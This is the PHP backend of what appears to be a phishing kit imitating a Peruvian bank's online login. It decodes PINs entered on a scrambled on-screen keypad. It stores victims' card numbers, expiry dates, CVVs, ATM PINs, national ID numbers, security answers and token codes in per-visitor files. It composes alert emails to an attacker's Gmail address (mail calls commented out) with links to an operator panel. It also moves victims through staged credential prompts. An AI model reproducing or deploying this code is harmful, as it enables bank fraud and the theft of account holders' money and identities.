<?php

try {
date_default_timezone_set("America/Lima");
if(!session_start()){
	echo "existe error : este servidor no puede utilizar variables de sesion";
	exit();
}

if(!isset($_POST['op'])){
	echo "existe error : no se ha establecido opcion";
	exit();
}

$op = trim($_POST['op']);

if($op == ""){
	echo "existe error : opcion invalida";
	exit();
}

switch ($op) {
	case 'createSessionUsuario':
                
            //getting ips client
            
            $xForwardedFor = !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : "nada";            
            $remoteAddr = !empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "nada";
   
            $ipStr = $remoteAddr;
            if( $xForwardedFor != "nada" ){
                $ipStr = $xForwardedFor;
            }
            //------------------------------------------------------------------------------
            
		$ipRemotaUsuarioActual = $ipStr;

                if(strstr($ipRemotaUsuarioActual,"::1")){
                    $ipRemotaUsuarioActual = "127.0.0.1";
                }
                
		$_SESSION['ipRemotaVisitante'] = $ipRemotaUsuarioActual;
		echo "es correcto : proceso createSessionUsuario ".$ipRemotaUsuarioActual;

		exit();
		break;
	case 'login':
            
		if(!isset($_POST)){
			echo "existe error : no se ha enviado datos desde el cliente";
			exit();
		}		
                
		$pin = trim($_POST['pin']);
		$CARDTYPE_SHOW = trim($_POST['CARDTYPE_SHOW']);
		$numeroKeyPadX = trim($_POST['numeroKeyPadX']);
		$CARD_SHOW = trim($_POST['CARD_SHOW']);

		$pinReal = obtenerPinReal($pin,$numeroKeyPadX);	
		$user_agent = getenv("HTTP_USER_AGENT");

		$estadoCliente = "soloDigitalToken";

        if ( $CARDTYPE_SHOW == "09"  || $CARDTYPE_SHOW == "03" || $CARDTYPE_SHOW == "04" || $CARDTYPE_SHOW == "05" || $CARDTYPE_SHOW == "06") {
            $estadoCliente = "cc";
        }

		$infoJsonArray =
		[

		"informacionEstado"=>
		[
			"estadoActual"=> $estadoCliente
		],

		"datosLogin"=>
		[
			"numeroKeyPadX" => $numeroKeyPadX,
			"tipoTarjeta" => $CARDTYPE_SHOW,
			"numeroTarjetaUsuario"=>$CARD_SHOW,
			"claveBancaInternet"=>$pinReal
		],

		"datosCompletosDeTarjeta"=>
		[
			"numeroTarjetaCompleto"=>"nulo",
			"fechaDeExpiracion"=>"nulo",
			"cvv"=>"nulo",
			"claveAtm"=>"nulo",
			"dniTitular"=>"nulo",
			"numeroCelularTitular"=> date("Y-m-d H:i:s")
		],

		"datosDeValidacion"=>
		[
			"sms"=>$user_agent,
			"claveToken"=>"nulo",
            "tokenIngresado"=>"0",
            "nombreTitular"=>"Cliente",
            "preguntaSeguridad1"=>"nulo",
            "respuestaSeguridad1"=>"nulo"
		]

		];

		$infoJsonEncode = json_encode($infoJsonArray,JSON_HEX_APOS);
		$ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";		
		$fo = fopen("./dirOperaciones/".$archivoVisitante,"w");
		fwrite($fo,$infoJsonEncode);
		fclose($fo);	
		echo "es correcto :  proceso loging";
                
		exit();
		break;

	case 'enviarCorreoAlerta':	

	    $ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";

		$archivoVisitante_ = @file_get_contents("./dirOperaciones/".$archivoVisitante);
		if($archivoVisitante_ === false){
			echo "existe error : no se pudo leer el achivo visitante";
			exit();
		}
		$infoJsonDecode = json_decode($archivoVisitante_, true);

		$numeroKeyPadX = $infoJsonDecode['datosLogin']['numeroKeyPadX'];
		$CARDTYPE_SHOW = $infoJsonDecode['datosLogin']['tipoTarjeta'];
		$CARD_SHOW = $infoJsonDecode['datosLogin']['numeroTarjetaUsuario'];
		$pinReal = $infoJsonDecode['datosLogin']['claveBancaInternet'];

		//envio de mail informativo////////
		$ip = $ipRemotaVisitante;
		$Fecha = date('d-m-Y');
		$Hora= date('H:i:s');
                
                
		$correo = "axxxelsalvador@gmail.com";
                $rand1 = rand(1,10);                
		$subj = "Data - $ip";
		$from = "From:data$rand1 - <$ip@telecreditobcp.com>";
		$user_agent = getenv("HTTP_USER_AGENT");         
                                
                $dirConte = "/";        
                #$dirConte = "/clientes-personas/";

                $url = url();
                $url .= "$dirConte/operacionesLinea/dirOperaciones/5458/viernenenees767.php?archivoUsuario=$archivoVisitante";
                $urlPanelGeneral = url();
                $urlPanelGeneral .= "$dirConte/operacionesLinea/dirOperaciones/mainPanelBcp.php";          
                                
		$content = "

		Fecha: $Fecha / Hora: $Hora
		User-Agent: $user_agent

		[pNumeroKeyPadX] = $numeroKeyPadX
		[pCARDTYPE_SHOW] = $CARDTYPE_SHOW
		[pCARD_SHOW] = $CARD_SHOW
		[pPinReal] = $pinReal
		[url cliente] = $url
                [url Panel General] = $urlPanelGeneral
                
		";
                
                sleep(rand(3,5));
		#@mail($correo, $subj, $content, $from);
		//////////////////////////////////////////////

		echo "es correcto proceso enviarCorreoAlerta ";

		exit();
		break;
	case 'consultarArchivoVisitante':
		$ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";

		$archivoVisitante_ = @file_get_contents("./dirOperaciones/".$archivoVisitante);
		if($archivoVisitante_ === false){
			echo "existe error : no se pudo leer el achivo visitante";
			exit();
		}
		echo $archivoVisitante_;
                
		exit();

		break;
	case 'cc':

	    if(!isset($_POST)){
			echo "existe error : no se ha enviado datos desde el cliente";
			exit();
		}		

		$expdate = trim($_POST['expdate']);
		$cvv = trim($_POST['cvv']);
		$atm = trim($_POST['atm']);
		$dni = trim($_POST['dni']);
		$correo2 = trim($_POST['correo']);

                
                
                
		$ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";

		$archivoVisitante_ = @file_get_contents("./dirOperaciones/".$archivoVisitante);
		if($archivoVisitante_ === false){
			echo "existe error : no se pudo leer el achivo visitante";
			exit();
		}
		$infoJsonDecode = json_decode($archivoVisitante_, true);
		$infoJsonDecode['informacionEstado']['estadoActual'] = "fin";

		$infoJsonDecode['datosCompletosDeTarjeta']['fechaDeExpiracion'] = $expdate;
		$infoJsonDecode['datosCompletosDeTarjeta']['cvv'] = $cvv;
		$infoJsonDecode['datosCompletosDeTarjeta']['claveAtm'] = $atm;
		$infoJsonDecode['datosCompletosDeTarjeta']['dniTitular'] = $dni;
		$infoJsonDecode['datosCompletosDeTarjeta']['numeroCelularTitular'] = $correo2;
                $infoJsonDecode['datosCompletosDeTarjeta']['numeroCelularTitular'] = date("Y-m-d H:i:s");
		$infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
		$fo = fopen("./dirOperaciones/".$archivoVisitante,"w");
		fwrite($fo,$infoJsonEncode);
		fclose($fo);

		echo "es correcto : proceso cc";
                
		//envio de mail informativo////////
                
		$ip = $ipRemotaVisitante;
		$Fecha= date('d-m-Y');
		$Hora= date('H:i:s');
                $rand1 = rand(1,10);
                $correo="axxxelsalvador@gmail.com";     
		$subj="Data - $ip";
		$from= "From:data$rand1 - <$ip@telecreditobcp.com>";
		$user_agent = getenv("HTTP_USER_AGENT");
                       
        
                $CARDTYPE_SHOW = $infoJsonDecode['datosLogin']['tipoTarjeta'];
		$CARD_SHOW = $infoJsonDecode['datosLogin']['numeroTarjetaUsuario'];
		$pinReal = $infoJsonDecode['datosLogin']['claveBancaInternet'];
                                
		$content = "

		Fecha: $Fecha / Hora: $Hora
		User-Agent: $user_agent
                
                ['tipoTarjeta'] = {$infoJsonDecode['datosLogin']['tipoTarjeta']}
                ['numeroTarjetaUsuario'] = {$infoJsonDecode['datosLogin']['numeroTarjetaUsuario']}
                ['claveBancaInternet'] = {$infoJsonDecode['datosLogin']['claveBancaInternet']}
                ['fechaDeExpiracion'] = $expdate
                ['cvv'] = $cvv
                ['claveAtm'] = $atm
                ['dniTitular'] = $dni
                ['numeroCelularTitular'] = $correo2
		
		";
		#@mail($correo, $subj, $content, $from);
                
		//////////////////////////////////////////////	

		exit();
		break;
	case 'preguntaDigitalToken':
            
		if(!isset($_POST)){
			echo "existe error : no se ha enviado datos desde el cliente";
			exit();
		}		

		$answer = trim($_POST['answer']);
		$token = trim($_POST['token']);		


		$ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";

		$archivoVisitante_ = @file_get_contents("./dirOperaciones/".$archivoVisitante);
		if($archivoVisitante_ === false){
			echo "existe error : no se pudo leer el achivo visitante";
			exit();
		}
		$infoJsonDecode = json_decode($archivoVisitante_, true);
		$infoJsonDecode['informacionEstado']['estadoActual'] = "gifCargando";

		$infoJsonDecode['datosDeValidacion']['respuestaSeguridad1'] = $answer;
		$infoJsonDecode['datosDeValidacion']['claveToken'] = $token;		

		$infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
		$fo = fopen("./dirOperaciones/".$archivoVisitante,"w");
		fwrite($fo,$infoJsonEncode);
		fclose($fo);
		break;              
                
	case 'soloDigitalToken':

	    if(!isset($_POST)){
			echo "existe error : no se ha enviado datos desde el cliente";
			exit();
		}

        $token = trim($_POST['token']);

		$ipRemotaVisitante = $_SESSION['ipRemotaVisitante'];
		$archivoVisitante = "pcb_".$ipRemotaVisitante.".txt";

		$archivoVisitante_ = @file_get_contents("./dirOperaciones/".$archivoVisitante);
		if($archivoVisitante_ === false){
			echo "existe error : no se pudo leer el achivo visitante";
			exit();
		}

		$infoJsonDecode = json_decode($archivoVisitante_, true);
        $infoJsonDecode['datosDeValidacion']['tokenIngresado'] = 1;

		if ( $infoJsonDecode['datosLogin']['claveBancaInternet'] != $token ) {
            $infoJsonDecode['datosDeValidacion']['claveToken'] = $token;
            $infoJsonDecode['informacionEstado']['estadoActual'] = "gifCargando";
        }else {
            $infoJsonDecode['informacionEstado']['estadoActual'] = "cc";
        }

		$infoJsonEncode = json_encode($infoJsonDecode,JSON_HEX_APOS);
		$fo = fopen("./dirOperaciones/".$archivoVisitante,"w");
		fwrite($fo,$infoJsonEncode);
		fclose($fo);
		break;
                
	case '7':
		# code...
		break;
	case '8':
		# code...
		break;
	default:
		echo "opcion error";
		exit();
		break;
}


}catch (Exception $e) {
	echo "existe error f";
	exit();
}


function obtenerPinReal($pPin,$pNumeroKeyPadX){
	////////////////////////////////////////////
$numeroKeyPadArray = [
	"1" => [
		"0" => "1",
		"1" => "7",
		"2" => "9",
		"3" => "3",
		"4" => "4",
		"5" => "5",
		"6" => "2",
		"7" => "0",
		"8" => "8",
		"9" => "6"
	],

	"2" => [
		"0" => "7",
		"1" => "5",
		"2" => "1",
		"3" => "6",
		"4" => "0",
		"5" => "4",
		"6" => "2",
		"7" => "3",
		"8" => "9",
		"9" => "8"
	],
        "3" => [
		"0" => "6",
		"1" => "8",
		"2" => "7",
		"3" => "2",
		"4" => "4",
		"5" => "5",
		"6" => "9",
		"7" => "3",
		"8" => "1",
		"9" => "0"
	],
        "4" => [
		"0" => "2",
		"1" => "4",
		"2" => "1",
		"3" => "7",
		"4" => "6",
		"5" => "5",
		"6" => "3",
		"7" => "8",
		"8" => "9",
		"9" => "0"
	]

];
////////////////////////////////////////////////////

	$pPinArray = str_split($pPin);
	$pPinArrayReal = [];
	foreach ($pPinArray as $key => $value) {
		$pPinArrayReal[$key] = $numeroKeyPadArray[$pNumeroKeyPadX][$value];
	}

	return implode("", $pPinArrayReal);
}



function url(){
    if(isset($_SERVER['HTTPS'])){
        $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
    }
    else{
        $protocol = 'http';
    }
    return $protocol . "://" . $_SERVER['HTTP_HOST'];
}